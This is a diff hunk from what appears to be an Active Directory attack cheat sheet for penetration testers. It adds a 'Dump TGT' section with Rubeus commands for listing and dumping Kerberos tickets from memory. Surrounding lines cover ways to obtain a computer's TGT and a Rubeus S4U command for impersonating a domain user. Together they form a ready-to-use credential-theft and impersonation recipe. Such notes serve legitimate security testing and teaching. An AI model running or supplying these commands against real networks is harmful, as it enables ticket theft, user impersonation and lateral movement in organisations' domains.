@@ -1243,6 +1243,12 @@ req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Conn
 - Gain access to a domain computer if we have its RC4, AES256 or TGT.
 - There are means of obtaining a TGT for a computer without already having local admin access to it, such as pairing the Printer Bug and a machine with unconstrained delegation, NTLM relaying scenarios and Active Directory Certificate Service abuse
 
+#### Dump TGT
+```
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:<LUID> /service:krbtgt
+```
+
 #### Request TGS
 ```
 .\Rubeus.exe s4u /user:<COMPUTERNAME>$ /msdsspn:cifs/<COMPUTER FQDN> /impersonateuser:<USER TO IMPERSONATE> /ticket:<TGT BASE64> /nowrap
